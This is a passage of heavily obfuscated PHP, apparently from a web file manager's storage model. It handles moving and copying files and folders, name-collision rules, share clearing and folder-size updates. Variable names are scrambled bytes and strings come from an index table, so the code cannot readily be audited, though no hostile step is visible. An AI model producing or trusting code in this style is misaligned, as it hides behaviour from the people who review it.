$¾©˜‘“) { $¨Ë²¼£Í =& $_SERVER[Ü©»’·]; $ˆ­Îò¨Œ = $¾©˜‘“[$¨Ë²¼£Í[530]]; $­şŸ¯‹ø = $this->parentLevelArray($úúˆÈù°[$¨Ë²¼£Í[530]]); foreach ($­şŸ¯‹ø as $·ˆùĞş) { if (isset($Æ„æ÷Ş[$·ˆùĞş])) { $ˆ­Îò¨Œ .= $Æ„æ÷Ş[$·ˆùĞş] . $¨Ë²¼£Í[591]; } } $ˆ­Îò¨Œ = rtrim($ˆ­Îò¨Œ, $¨Ë²¼£Í[50]) . $¨Ë²¼£Í[50]; $…ˆÌ¿ = $this->parentLevelArray($ˆ­Îò¨Œ); $øÆ£š¹ = $…ˆÌ¿[count($…ˆÌ¿) - 1]; return array($¨Ë²¼£Í[441] => $øÆ£š¹, $¨Ë²¼£Í[530] => $ˆ­Îò¨Œ); } private function _makeItemData($‡Èõ®µÎ, $˜İ³ìç, $÷°Š£ôï) { $·Œ“ÜëÅ =& $_SERVER[Ü©»’·]; $˜Ó¥¦•± = array($·Œ“ÜëÅ[592] => $‡Èõ®µÎ[$·Œ“ÜëÅ[419]], $·Œ“ÜëÅ[429] => $÷°Š£ôï, $·Œ“ÜëÅ[593] => $‡Èõ®µÎ[$·Œ“ÜëÅ[421]] ? $‡Èõ®µÎ[$·Œ“ÜëÅ[421]] : $·Œ“ÜëÅ[12], $·Œ“ÜëÅ[478] => $‡Èõ®µÎ[$·Œ“ÜëÅ[477]] ? $‡Èõ®µÎ[$·Œ“ÜëÅ[477]] : 0, $·Œ“ÜëÅ[594] => $‡Èõ®µÎ[$·Œ“ÜëÅ[76]] ? $‡Èõ®µÎ[$·Œ“ÜëÅ[76]] : 0, $·Œ“ÜëÅ[595] => intval($˜İ³ìç[$·Œ“ÜëÅ[420]]), $·Œ“ÜëÅ[596] => intval($˜İ³ìç[$·Œ“ÜëÅ[514]]), $·Œ“ÜëÅ[597] => intval(USER_ID), $·Œ“ÜëÅ[598] => intval(USER_ID), $·Œ“ÜëÅ[410] => intval($˜İ³ìç[$·Œ“ÜëÅ[411]]), $·Œ“ÜëÅ[599] => $˜İ³ìç[$·Œ“ÜëÅ[530]] . $˜İ³ìç[$·Œ“ÜëÅ[411]] . $·Œ“ÜëÅ[50], $·Œ“ÜëÅ[433] => $‡Èõ®µÎ[$·Œ“ÜëÅ[85]] ? $‡Èõ®µÎ[$·Œ“ÜëÅ[85]] : time(), $·Œ“ÜëÅ[439] => 0, $·Œ“ÜëÅ[600] => $·Œ“ÜëÅ[12]); return $˜Ó¥¦•±; } private function _copyApplyMeta($³¯ÍÎ¶˜, &$ÖˆêÜİ) { $ŸŸøºŠÌ =& $_SERVER[Ü©»’·]; $ÒËÇÀø‹ = $³¯ÍÎ¶˜[$ŸŸøºŠÌ[411]]; $·Î¬£” = $³¯ÍÎ¶˜[$ŸŸøºŠÌ[32]]; if (!isset($³¯ÍÎ¶˜[$ŸŸøºŠÌ[601]]) || !$³¯ÍÎ¶˜[$ŸŸøºŠÌ[601]] || $³¯ÍÎ¶˜[$ŸŸøºŠÌ[601]] == $ŸŸøºŠÌ[197]) { $ÖˆêÜİ[$ŸŸøºŠÌ[577]][] = array($ŸŸøºŠÌ[411], $ÒËÇÀø‹, $ŸŸøºŠÌ[601], short_id($ÒËÇÀø‹)); } if (Input::check($·Î¬£”, $ŸŸøºŠÌ[602])) { $ÖˆêÜİ[$ŸŸøºŠÌ[576]][] = array($ŸŸøºŠÌ[411] => $ÒËÇÀø‹, $ŸŸøºŠÌ[94] => $ŸŸøºŠÌ[474], $ŸŸøºŠÌ[383] => str_replace($ŸŸøºŠÌ[53], $ŸŸøºŠÌ[12], Pinyin::get($·Î¬£”))); $ÖˆêÜİ[$ŸŸøºŠÌ[576]][] = array($ŸŸøºŠÌ[411] => $ÒËÇÀø‹, $ŸŸøºŠÌ[94] => $ŸŸøºŠÌ[473], $ŸŸøºŠÌ[383] => Pinyin::get($·Î¬£”, $ŸŸøºŠÌ[603])); } $ÖˆêÜİ[$ŸŸøºŠÌ[576]][] = array($ŸŸøºŠÌ[411] => $ÒËÇÀø‹, $ŸŸøºŠÌ[94] => $ŸŸøºŠÌ[453], $ŸŸøºŠÌ[383] => KodSort::makeStr($·Î¬£”)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Ûà¯˜›) { $Î±æì£ =& $_SERVER[Ü©»’·]; $¦Õ¿…İ± = $this->sourceInfo($Ûà¯˜›); $ñÅÍÖÕá = $Î±æì£[604]; $¯µÉ¬Ö = array($Î±æì£[530] => array($Î±æì£[559], $¦Õ¿…İ±[$Î±æì£[530]] . $Ûà¯˜› . $Î±æì£[560]), $Î±æì£[440] => $this->targetIsDelete); $¾ğÓîì = $this->field($ñÅÍÖÕá)->where($¯µÉ¬Ö)->select(); if (!$¾ğÓîì) { return; } $¾ğÓîì = array_to_keyvalue($¾ğÓîì, $Î±æì£[411]); foreach ($¾ğÓîì as $¡×äö²í) { $Ò¨ÃÑİ¤ = $¡×äö²í[$Î±æì£[441]]; $Ûà¯˜› = $¡×äö²í[$Î±æì£[411]]; if (!isset($this->_childrenListCache[$Ûà¯˜›]) && $¡×äö²í[$Î±æì£[419]] == $Î±æì£[88]) { $this->_childrenListCache[$Ûà¯˜›] = array(); } if (!isset($this->_childrenListCache[$Ò¨ÃÑİ¤])) { $this->_childrenListCache[$Ò¨ÃÑİ¤] = array(); } $this->_childrenListCache[$Ò¨ÃÑİ¤][$Ûà¯˜›] = $¡×äö²í; $this->_childrenItemCache[$Ûà¯˜›] = $¡×äö²í; } } private function _childrenListAll($äğß½áÌ, &$¿‹•—) { $¥¿—’ªÄ =& $_SERVER[Ü©»’·]; if (!isset($this->_childrenListCache[$äğß½áÌ])) { return; } $Ë„Ìú“í = $this->_childrenListCache[$äğß½áÌ]; foreach ($Ë„Ìú“í as $îÊãÈóÖ => $ÑÌË‰á¯) { $¿‹•—[$îÊãÈóÖ] = $ÑÌË‰á¯; if ($ÑÌË‰á¯[$¥¿—’ªÄ[419]] == $¥¿—’ªÄ[88]) { $this->_childrenListAll($îÊãÈóÖ, $¿‹•—); } } } private function sourceInfoCache($â‚†à‹—) { if (isset($this->_childrenItemCache[$â‚†à‹—])) { return $this->_childrenItemCache[$â‚†à‹—]; } return $this->sourceInfo($â‚†à‹—); } private function _childrenList($„¿è³­‰) { if (isset($this->_childrenListCache[$„¿è³­‰])) { return $this->_childrenListCache[$„¿è³­‰]; } return $this->_childrenListSelect($„¿è³­‰); } private function _childrenListSelect($À’Ñ§¿ò) { $©š©ÜŠ³ =& $_SERVER[Ü©»’·]; $½”«¼ÅÔ = array($©š©ÜŠ³[441] => $À’Ñ§¿ò, $©š©ÜŠ³[440] => $this->targetIsDelete); $€­ËÕ›„ = $this->where($½”«¼ÅÔ)->select(); $€­ËÕ›„ = $€­ËÕ›„ ? $€­ËÕ›„ : array(); $´ıßıø = array_to_keyvalue($€­ËÕ›„, $©š©ÜŠ³[411]); $this->_childrenListCache[$À’Ñ§¿ò] = $´ıßıø; foreach ($´ıßıø as $À’Ñ§¿ò => $ûÖÅéªŞ) { $this->_childrenItemCache[$À’Ñ§¿ò] = $ûÖÅéªŞ; } return $´ıßıø; } private function fileNameExistCache($ı±‚ô, $²»ç–ÒŸ) { $ñèí–‡” =& $_SERVER[Ü©»’·]; $²»ç–ÒŸ = strtolower($²»ç–ÒŸ); $ŸÒë“€â = $this->_childrenList($ı±‚ô); foreach ($ŸÒë“€â as $İñÚÈ–ù) { if ($²»ç–ÒŸ == strtolower($İñÚÈ–ù[$ñèí–‡”[32]])) { return $İñÚÈ–ù[$ñèí–‡”[411]]; } } return !1; } private function fileNameAutoCache($ü©›„ö°, $ÈÖ¥§Àä, $á”†ÔÊº, $õ–ûÒãÔ) { $şì–çÅõ =& $_SERVER[Ü©»’·]; $¨âÖ÷²û = $this->_childrenList($ü©›„ö°); $Ã¼Ë¥•æ = array_to_keyvalue($¨âÖ÷²û, $şì–çÅõ[12], $şì–çÅõ[32]); return $this->fileNameAutoGet($Ã¼Ë¥•æ, $ÈÖ¥§Àä, $á”†ÔÊº, $õ–ûÒãÔ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($¢×™Ãëö, $ïÇ¼– ë, $¶Ì„¥™ = REPEAT_REPLACE, $ˆã×Èï¡ = '') { $æøóï¹ =& $_SERVER[Ü©»’·]; $Ğì¥òÖ = $this->sourceInfo($¢×™Ãëö); $å«È›èú = $this->sourceInfo($ïÇ¼– ë); if ($Ğì¥òÖ[$æøóï¹[441]] == $å«È›èú[$æøóï¹[411]]) { if ($Ğì¥òÖ[$æøóï¹[440]] == $æøóï¹[88]) { Model($æøóï¹[438])->restore(array($¢×™Ãëö)); } if (!$ˆã×Èï¡ || $ˆã×Èï¡ == $Ğì¥òÖ[$æøóï¹[32]]) { return $¢×™Ãëö; } } $áßà—ÑË = $this->pathInfoMore($¢×™Ãëö); if ($this->isParentOf($¢×™Ãëö, $ïÇ¼– ë)) { return !1; } if (!$Ğì¥òÖ || !$å«È›èú || $å«È›èú[$æøóï¹[419]] != $æøóï¹[88]) { return !1; } Hook::trigger($æøóï¹[605], $áßà—ÑË); $this->targetIsDelete = intval($Ğì¥òÖ[$æøóï¹[440]]); if ($Ğì¥òÖ[$æøóï¹[441]] == $ïÇ¼– ë && $ˆã×Èï¡ != $Ğì¥òÖ[$æøóï¹[32]]) { $ïıâØ¬® = $this->fileNameExist($ïÇ¼– ë, $ˆã×Èï¡); if ($ïıâØ¬® && $Ğì¥òÖ[$æøóï¹[419]] == $æøóï¹[197]) { $ø­Àü™­ = $this->sourceInfo($ïıâØ¬®); $šÏşŠ³× = $this->fileHistory($ø­Àü™­, $Ğì¥òÖ[$æøóï¹[477]], $Ğì¥òÖ[$æøóï¹[76]]); if (!$šÏşŠ³×) { Model($æøóï¹[480])->remove($Ğì¥òÖ[$æøóï¹[477]]); } $this->removeNow($¢×™Ãëö, !1); $this->folderSizeReset($ïÇ¼– ë); Hook::trigger($æøóï¹[606], $áßà—ÑË); return $ïıâØ¬®; } } $©ôÑ¡Ã× = $ˆã×Èï¡ ? $ˆã×Èï¡ : $Ğì¥òÖ[$æøóï¹[32]]; $this->lockMoveStart($¢×™Ãëö); $this->lockWriteStart($ïÇ¼– ë, $©ôÑ¡Ã×); $ äàÀ¾µ = array($æøóï¹[575] => array(), $æøóï¹[607] => !1); $this->clearShare($¢×™Ãëö, $ïÇ¼– ë); $Œ•™¹Ñ¯ = $this->fileNameExistCache($ïÇ¼– ë, $Ğì¥òÖ[$æøóï¹[32]]); $ÔĞƒ–› = $this->_move($¢×™Ãëö, $ïÇ¼– ë, $¶Ì„¥™, $ äàÀ¾µ, $ˆã×Èï¡); $this->sourceCacheClear(); if ($Ğì¥òÖ[$æøóï¹[419]] == $æøóï¹[88] && $Œ•™¹Ñ¯) { $this->folderSizeResetChildren($ÔĞƒ–›); } Model($æøóï¹[199])->linkAdd($ äàÀ¾µ[$æøóï¹[575]]); if ($Œ•™¹Ñ¯ && $ äàÀ¾µ[$æøóï¹[607]]) { $this->removeNow($¢×™Ãëö, !1); } $this->lockMoveEnd($¢×™Ãëö); $this->lockWriteEnd($ïÇ¼– ë, $©ôÑ¡Ã×); $this->folderSizeReset($Ğì¥òÖ[$æøóï¹[441]]); $this->folderSizeReset($ïÇ¼– ë); $Îáü˜öª = array($Ğì¥òÖ[$æøóï¹[441]], $ïÇ¼– ë); if ($Ğì¥òÖ[$æøóï¹[419]] == $æøóï¹[88]) { $Îáü˜öª[] = $¢×™Ãëö; } $this->updateModifyTime($Îáü˜öª); Model($æøóï¹[579])->eventMove($¢×™Ãëö, $Ğì¥òÖ[$æøóï¹[441]], $ïÇ¼– ë); Hook::trigger($æøóï¹[606], $áßà—ÑË); return $ÔĞƒ–›; } private function _move($¬Ê‡÷ø¼, $«á—¬’ô, $éÒ›Ìõè, &$µ¤Ú¤Ï”, $êÕ«ÛË = '') { $à´ö”µ =& $_SERVER[Ü©»’·]; $„ø¸‘¯ = $this->sourceInfo($¬Ê‡÷ø¼); $éäĞ õ« = $„ø¸‘¯[$à´ö”µ[419]] == $à´ö”µ[88]; $ªÀÃîå¶ = $êÕ«ÛË ? $êÕ«ÛË : $„ø¸‘¯[$à´ö”µ[32]]; $º–é¯  = $this->fileNameExistCache($«á—¬’ô, $ªÀÃîå¶); $this->lockMoveStart($¬Ê‡÷ø¼); $this->lockWriteStart($«á—¬’ô, $ªÀÃîå¶); if (!$º–é¯ ) { return $this->_moveForce($¬Ê‡÷ø¼, $«á—¬’ô, $ªÀÃîå¶); } $ÏùÚ°àß = $º–é¯ ; $üøóú‚  = !1; if ($éäĞ õ«) { if ($éÒ›Ìõè == REPEAT_RENAME_FOLDER) { $ªÀÃîå¶ = $this->fileNameAuto($«á—¬’ô, $ªÀÃîå¶, $éÒ›Ìõè, $éäĞ õ«); $ÏùÚ°àß = $this->_moveForce($¬Ê‡÷ø¼, $«á—¬’ô, $ªÀÃîå¶); } else { if ($éÒ›Ìõè == REPEAT_RENAME_FOLDER) { $éÒ›Ìõè = REPEAT_RENAME; } $ÂØ±ïÎ” = $this->_childrenListSelect($¬Ê‡÷ø¼); foreach ($ÂØ±ïÎ” as $úÈ¯Ä–) { $this->_move($úÈ¯Ä–[$à´ö”µ[411]], $º–é¯ , $éÒ›Ìõè, $µ¤Ú¤Ï”); } $üøóú‚  = !0; } } else { if ($éÒ›Ìõè == REPEAT_SKIP) { $üøóú‚  = !0; } else { if ($éÒ›Ìõè == REPEAT_RENAME || $éÒ›Ìõè == REPEAT_RENAME_FOLDER) { $ªÀÃîå¶ = $this->fileNameAuto($«á—¬’ô, $ªÀÃîå¶, $éÒ›Ìõè, $éäĞ õ«); $ÏùÚ°àß = $this->_moveForce($¬Ê‡÷ø¼, $«á—¬’ô, $ªÀÃîå¶); } else { if ($éÒ›Ìõè == REPEAT_REPLACE) { $¼Íıı = $this->sourceInfoCache($º–é¯ ); $›ù¶ƒ–Ì = $this->fileHistory($¼Íıı, $„ø¸‘¯[$à´ö”µ[477]], $„ø¸‘¯[$à´ö”µ[76]]); $üøóú‚  = !0; if ($›ù¶ƒ–Ì) { $µ¤Ú¤Ï”[$à´ö”µ[575]][] = $„ø¸‘¯[$à´ö”µ[477]]; } } } } } if ($üøóú‚  && !$µ¤Ú¤Ï”[$à´ö”µ[607]]) { $µ¤Ú¤Ï”[$à´ö”µ[607]] = !0; } return $ÏùÚ°àß; } private function _moveForce($ß¥í‡ÄÃ, $á¤æ›¶Á, $ìì²†½ï) { $ö¸¸‘Õ¬ =& $_SERVER[Ü©»’·]; $üëúµæ‹ = $this->sourceInfo($ß¥í‡ÄÃ); $úƒìÕ° = $this->sourceInfo($á¤æ›¶Á); $‡Á™Öæ = $üëúµæ‹[$ö¸¸‘Õ¬[419]] == $ö¸¸‘Õ¬[88]; $¹íŒÑÙÂ = array($ö¸¸‘Õ¬[410] => $úƒìÕ°[$ö¸¸‘Õ¬[411]], $ö¸¸‘Õ¬[599] => $úƒìÕ°[$ö¸¸‘Õ¬[530]] . $úƒìÕ°[$ö¸¸‘Õ¬[411]] . $ö¸¸‘Õ¬[50], $ö¸¸‘Õ¬[595] => $úƒìÕ°[$ö¸¸‘Õ¬[420]], $ö¸¸‘Õ¬[596] => $úƒìÕ°[$ö¸¸‘Õ¬[514]], $ö¸¸‘Õ¬[598] => USER_ID, $ö¸¸‘Õ¬[429] => $ìì²†½ï); $îÆ¹“è² = $üëúµæ‹[$ö¸¸‘Õ¬[420]] == SourceModel::TYPE_GROUP && $úƒìÕ°[$ö¸¸‘Õ¬[420]] == SourceModel::TYPE_GROUP && $üëúµæ‹[$ö¸¸‘Õ¬[514]] == $úƒìÕ°[$ö¸¸‘Õ¬[514]]; if (!$îÆ¹“è² && $this->moveClearAuth) { Model($ö¸¸‘Õ¬[511])->authClear($ß¥í‡ÄÃ); } $ÂŒ´½ù = $üëúµæ‹[$ö¸¸‘Õ¬[440]] == $ö¸¸‘Õ¬[88] && $úƒìÕ°[$ö¸¸‘Õ¬[440]] != $ö¸¸‘Õ¬[88]; if ($ÂŒ´½ù) { $¹íŒÑÙÂ[$ö¸¸‘Õ¬[439]] = 0; } if ($‡Á™Öæ) { $Ëò”˜¬– = array($ö¸¸‘Õ¬[599] => array($ö¸¸‘Õ¬[559], $üëúµæ‹[$ö¸¸‘Õ¬[530]] . $üëúµæ‹[$ö¸¸‘Õ¬[411]] . $ö¸¸‘Õ¬[560])); $¢„ÏÏèğ = $üëúµæ‹[$ö¸¸‘Õ¬[530]] . $üëúµæ‹[$ö¸¸‘Õ¬[411]] . $ö¸¸‘Õ¬[50]; $™îÑÒí— = $úƒìÕ°[$ö¸¸‘Õ¬[530]] . $úƒìÕ°[$ö¸¸‘Õ¬[411]] . $ö¸¸‘Õ¬[50] . $üëúµæ‹[$ö¸¸‘Õ¬[411]] . $ö¸¸‘Õ¬[50]; $·ş¾Ø®§ = array($ö¸¸‘Õ¬[599] => array($ö¸¸‘Õ¬[608], "\162\x65\160\x6c\141\x63\145\x28\160\141\x72\145\x6e\164\114\145\166\x65\x6c\x2c\x27{$¢„ÏÏèğ}\47\x2c\47{$™îÑÒí—}\47\51"), $ö¸¸‘Õ¬[595] => $úƒìÕ°[$ö¸¸‘Õ¬[420]], $ö¸¸‘Õ¬[596] => $úƒìÕ°[$ö¸¸‘Õ¬[514]]); if ($ÂŒ´½ù) { $·ş¾Ø®§[$ö¸¸‘Õ¬[439]] = 0; } $this->where($Ëò”˜¬–)->data($·ş¾Ø®§)->save(); } $this->where(array($ö¸¸‘Õ¬[426] => $ß¥í‡ÄÃ))->data($¹íŒÑÙÂ)->save(); return $ß¥í‡ÄÃ; } private function clearShare($âîá€¢İ, $ì†µà”«) { $»æ¢çóÜ =& $_SERVER[Ü©»’·]; $óÈñ™¯¡ = $this->sourceInfo($âîá€¢İ); $¢í¸¨‡ = $this->sourceInfo($ì†µà”«); if ($óÈñ™¯¡[$»æ¢çóÜ[514]] == $¢í¸¨‡[$»æ¢çóÜ[514]] && $óÈñ™¯¡[$»æ¢çóÜ[420]] == $»æ¢çóÜ[609]) { return; } $ìÓ‘‰à = array($»æ¢çóÜ[530] => array($»æ¢çóÜ[559], $óÈñ™¯¡[$»æ¢çóÜ[530]] . $âîá€¢İ . $»æ¢çóÜ[560])); $é½ßå¬Ğ = $this->field($»æ¢çóÜ[426])->where($ìÓ‘‰à)->getField($»æ¢çóÜ[411], !0); if (!$é½ßå¬Ğ) { return; } $ìÓ‘‰à = array($»æ¢çóÜ[411] => array($»æ¢çóÜ[7], $é½ßå¬Ğ), $»æ¢çóÜ[505] => 1); $Şüî¡®™ = Model($»æ¢çóÜ[610])->field($»æ¢çóÜ[498])->where($ìÓ‘‰à)->select(); if (!$Şüî¡®™) { return; } $Şüî¡®™ = array_to_keyvalue($Şüî¡®™, $»æ¢çóÜ[12], $»æ¢çóÜ[498]); $ìÓ‘‰à = array($»æ¢çóÜ[498] => array($»æ¢çóÜ[7], $Şüî¡®™)); Model($»æ¢çóÜ[610])->where($ìÓ‘‰à)->save(array($»æ¢çóÜ[505] => 0)); Model($»æ¢çóÜ[611])->where($ìÓ‘‰à)->delete(); } public function copyFolderFromIO($âïÏš°º, $ÁéĞ«, $™¡Å£ü±, $›âêöÉ÷, $–Ççî¿Ñ, $Üøë¿·À = false) { $ú–ø­§… =& $_SERVER[Ü©»’·]; $è¼«Œşï = array($ú–ø­§…[576] => array(), $ú–ø­§…[577] => array(), $ú–ø­§…[575] => array(), $ú–ø­§…[612] => array()); $’€†²“Ê = $Üøë¿·À ? $Üøë¿·À : $âïÏš°º->pathThis($ÁéĞ«); $¡§áÇ™ = $this->fileNameExist($™¡Å£ü±, $’€†²“Ê); $¬âÚäÑ = $this->mkdir($™¡Å£ü±, $’€†²“Ê, $›âêöÉ÷); if (!$¡§áÇ™ || $›âêöÉ÷ == REPEAT_RENAME_FOLDER) { $›âêöÉ÷ = !1; } if ($¡§áÇ™) { $this->_childrenAllMake($¡§áÇ™); } Hook::trigger($ú–ø­§…[613]); $this->_copyChildTo($âïÏš°º, $ÁéĞ«, $¬âÚäÑ, $›âêöÉ÷, $è¼«Œşï, $–Ççî¿Ñ); Hook::trigger($ú–ø­§…[614]); if ($¬âÚäÑ) { $this->folderSizeResetChildren($¬âÚäÑ); } $this->_childrenListClear(); Model($ú–ø­§…[578])->addAll($è¼«Œşï[$ú–ø­§…[576]], array(), !0); Model($ú–ø­§…[579])->eventCopy($¬âÚäÑ); $this->saveAll($è¼«Œşï[$ú–ø­§…[577]]); Model($ú–ø­§…[480])->linkAdd($è¼«Œşï[$ú–ø­§…[575]]); Model($ú–ø­§…[480])->remove($è¼«Œşï[$ú–ø­§…[612]]); $this->folderSizeReset($™¡Å£ü±); $this->updateModifyTime($™¡Å£ü±); return $¬âÚäÑ; } private function _copyChildTo($Áß˜¬ñ¹, $‡ÈŸÓ³Ù, $ËÏ’Ÿ¥”, $¿Ìê«õî, &$©ÚÏ¼º¼, $ÛõÎ¯˜ş) { $ù»³¦ñ» =& $_SERVER[Ü©»’·]; $ÑŠó³³ = $this->sourceInfoCache($ËÏ’Ÿ¥”); $ÂĞ’½ë‚ = $Áß˜¬ñ¹->listPath($‡ÈŸÓ³Ù); $ÂĞ’½ë‚ = $ÂĞ’½ë‚ ? $ÂĞ’½ë‚ : array($ù»³¦ñ»[83] => array(), $ù»³¦ñ»[82] => array()); $‘ƒœİÓË = array_merge($ÂĞ’½ë‚[$ù»³¦ñ»[83]], $ÂĞ’½ë‚[$ù»³¦ñ»[82]]); $‰‹ÆÁº = $this->_addFiles($Áß˜¬ñ¹, $ÂĞ’½ë‚[$ù»³¦ñ»[83]], $ÛõÎ¯˜ş); $Û¸û©ş» = array(); foreach ($‘ƒœİÓË as &$ºÜÁ¹¯½) { if (isset($‰‹ÆÁº[$ºÜÁ¹¯½[$ù»³¦ñ»[32]]])) { $ºÜÁ¹¯½ = $‰‹ÆÁº[$ºÜÁ¹¯½[$ù»³¦ñ»[32]]]; } $ºÜÁ¹¯½[$ù»³¦ñ»[419]] = $ºÜÁ¹¯½[$ù»³¦ñ»[33]] == $ù»³¦ñ»[75]; $ºÜÁ¹¯½[$ù»³¦ñ»[421]] = substr(_get($ºÜÁ¹¯½, $ù»³¦ñ»[174], $ù»³¦ñ»[12]), 0, 10); $ºÜÁ¹¯½[$ù»³¦ñ»[76]] = _get($ºÜÁ¹¯½, $ù»³¦ñ»[76], 0); $ºÜÁ¹¯½[$ù»³¦ñ»[477]] = _get($ºÜÁ¹¯½, $ù»³¦ñ»[477], 0); if (!isset($ºÜÁ¹¯½[$ù»³¦ñ»[615]]) && $ºÜÁ¹¯½[$ù»³¦ñ»[477]]) { $©ÚÏ¼º¼[$ù»³¦ñ»[612]][] = $ºÜÁ¹¯½[$ù»³¦ñ»[477]]; } if ($¿Ìê«õî) { $³Ìî®„Ï = $this->fileNameExistCache($ËÏ’Ÿ¥”, $ºÜÁ¹¯½[$ù»³¦ñ»[32]]); if ($³Ìî®„Ï) { if ($ºÜÁ¹¯½[$ù»³¦ñ»[419]] || $¿Ìê«õî == REPEAT_SKIP) { continue; } if ($¿Ìê«õî == REPEAT_REPLACE) { $Ö•Î¦ÄÛ = $this->sourceInfoCache($³Ìî®„Ï); $ÛäÊì·¾ = $this->fileHistory($Ö•Î¦ÄÛ, $ºÜÁ¹¯½[$ù»³¦ñ»[477]], $ºÜÁ¹¯½[$ù»³¦ñ»[76]]); if ($ÛäÊì·¾) { $©ÚÏ¼º¼[$ù»³¦ñ»[575]][] = $ºÜÁ¹¯½[$ù»³¦ñ»[477]]; } continue; } else { if ($¿Ìê«õî == REPEAT_RENAME) { $ºÜÁ¹¯½[$ù»³¦ñ»[32]] = $this->fileNameAutoCache($ËÏ’Ÿ¥”, $ºÜÁ¹¯½[$ù»³¦ñ»[32]], $¿Ìê«õî, !1); } } } } if (!$ºÜÁ¹¯½[$ù»³¦ñ»[419]] && $ºÜÁ¹¯½[$ù»³¦ñ»[477]] == 0) { continue; } if (!$ºÜÁ¹¯½[$ù»³¦ñ»[419]] && $ºÜÁ¹¯½[$ù»³¦ñ»[477]]) { $©ÚÏ¼º¼[$ù»³¦ñ»[575]][] = $ºÜÁ¹¯½[$ù»³¦ñ»[477]]; } $Û¸û©ş»[] = $this->_makeItemData($ºÜÁ¹¯½, $ÑŠó³³, $ºÜÁ¹¯½[$ù»³¦ñ»[32]]); } unset($ºÜÁ¹¯½); if (!empty($Û¸û©ş»)) { $this->addAll($Û¸û©ş»); $this->_childrenListSelect($ËÏ’Ÿ¥”); } $‚Ù–¦í = $this->_childrenList($ËÏ’Ÿ¥”); $‚Ù–¦í = array_to_keyvalue($‚Ù–¦í, $ù»³¦ñ»[32]); foreach ($‘ƒœİÓË as $ºÜÁ¹¯½) { $Ö•Î¦ÄÛ = $‚Ù–¦í[$ºÜÁ¹¯½[$ù»³¦ñ»[32]]]; $¯æ–©ºÖ = $Ö•Î¦ÄÛ[$ù»³¦ñ»[411]]; $this->_copyApplyMeta($Ö•Î¦ÄÛ, $©ÚÏ¼º¼); if ($ºÜÁ¹¯½[$ù»³¦ñ»[33]] == $ù»³¦ñ»[75]) { $ºÜÁ¹¯½[$ù»³¦ñ»[84]] = $Áß˜¬ñ¹->getPathInner($ºÜÁ¹¯½[$ù»³¦ñ»[84]]); $this->_copyChildTo($Áß˜¬ñ¹, $ºÜÁ¹¯½[$ù»³¦ñ»[84]], $¯æ–©ºÖ, $¿Ìê«õî, $©ÚÏ¼º¼, $ÛõÎ¯˜ş); } } } private function _addFiles($»ĞúâëÜ, $å©Ü¿, $ñŞü¤õõ) { $ÖµŠœ¢Õ =& $_SERVER[Ü©»’·]; if (!$å©Ü¿ || count($å©Ü¿) == 0) { return array(); } $·£êö’Ë = array(); foreach ($å©Ü¿ as &$úÏïé¿) { Hook::trigger($ÖµŠœ¢Õ[616], $úÏïé¿); $úÏïé¿[$ÖµŠœ¢Õ[84]] = $»ĞúâëÜ->getPathInner($úÏïé¿[$ÖµŠœ¢Õ[84]]); $Æà£Ø‘˜ = $»ĞúâëÜ->hashSimple($úÏïé¿[$ÖµŠœ¢Õ[84]]); $á²×ğå = $»ĞúâëÜ->hashMd5($úÏïé¿[$ÖµŠœ¢Õ[84]]); if (strlen($á²×ğå) > 10 && !isset($·£êö’Ë[$á²×ğå])) { $·£êö’Ë[$á²×ğå] = array(); } $úÏïé¿[$ÖµŠœ¢Õ[177]] = $Æà£Ø‘˜; $úÏïé¿[$ÖµŠœ¢Õ[176]] = $á²×ğå; $·£êö’Ë[$á²×ğå][] =& $úÏïé¿; if (count($·£êö’Ë[$á²×ğå]) > 1) { $úÏïé¿[$ÖµŠœ¢Õ[615]] = !0; } Hook::trigger($ÖµŠœ¢Õ[617], $úÏïé¿); } unset($úÏïé¿); $‹³àş× = array($ÖµŠœ¢Õ[176] => array($ÖµŠœ¢Õ[7], array_keys($·£êö’Ë))); $ìíĞÄµĞ = Model($ÖµŠœ¢Õ[618]); $®ÜšŸÖ = $ìíĞÄµĞ->where($‹³àş×)->select(); $®ÜšŸÖ = $®ÜšŸÖ ? $®ÜšŸÖ : array(); foreach ($®ÜšŸÖ as $Í‹É´ÉŸ) { if (!isset($·£êö’Ë[$Í‹É´ÉŸ[$ÖµŠœ¢Õ[176]]])) { continue; } $’ëƒ‡²ó = $·£êö’Ë[$Í‹É´ÉŸ[$ÖµŠœ¢Õ[176]]]; foreach ($’ëƒ‡²ó as &$úÏïé¿) { $úÏïé¿[$ÖµŠœ¢Õ[477]] = $Í‹É´ÉŸ[$ÖµŠœ¢Õ[477]]; $úÏïé¿[$ÖµŠœ¢Õ[615]] = !0; } unset($úÏïé¿); } $¬ß® İ = array(); foreach ($å©Ü¿ as $­Î´ãùÈ) { Hook::trigger($ÖµŠœ¢Õ[619], $­Î´ãùÈ); if (isset($­Î´ãùÈ[$ÖµŠœ¢Õ[615]]) && $­Î´ãùÈ[$ÖµŠœ¢Õ[615]]) { Hook::trigger($ÖµŠœ¢Õ[620], $­Î´ãùÈ); continue; } $ìõû¡Ï = $»ĞúâëÜ->getPathInner($­Î´ãùÈ[$ÖµŠœ¢Õ[84]]); $å…‚Ä‰– = $ìíĞÄµĞ->addFileMake($ìõû¡Ï, $­Î´ãùÈ[$ÖµŠœ¢Õ[76]], $­Î´ãùÈ[$ÖµŠœ¢Õ[177]], $­Î´ãùÈ[$ÖµŠœ¢Õ[176]], $­Î´ãùÈ[$ÖµŠœ¢Õ[32]], $ñŞü¤õõ); Hook::trigger($ÖµŠœ¢Õ[620], $­Î´ãùÈ); if (!is_array($å…‚Ä‰–)) { continue; } $¬ß® İ[] = $å…‚Ä‰–; } $ìíĞÄµĞ->addAll($¬ß® İ); $‹³àş× = array($ÖµŠœ¢Õ[176] => array($ÖµŠœ¢Õ[7], array_keys($·£êö’Ë))); $®ÜšŸÖ = $ìíĞÄµĞ->where($‹³àş×)->select(); $®ÜšŸÖ = $®ÜšŸÖ ? $®ÜšŸÖ : array(); foreach ($®ÜšŸÖ as $Í‹É´ÉŸ) { if (!isset($·£êö’Ë[$Í‹É´ÉŸ[$ÖµŠœ¢Õ[176]]])) { continue; } $·ı¦£İÓ =& $·£êö’Ë[$Í‹É´ÉŸ[$ÖµŠœ¢Õ[176]]]; foreach ($·ı¦£İÓ as &$úÏïé¿) { $úÏïé¿[$ÖµŠœ¢Õ[477]] = $Í‹É´ÉŸ[$ÖµŠœ¢Õ[477]]; } unset($úÏïé¿); } $µË©øô = array(); foreach 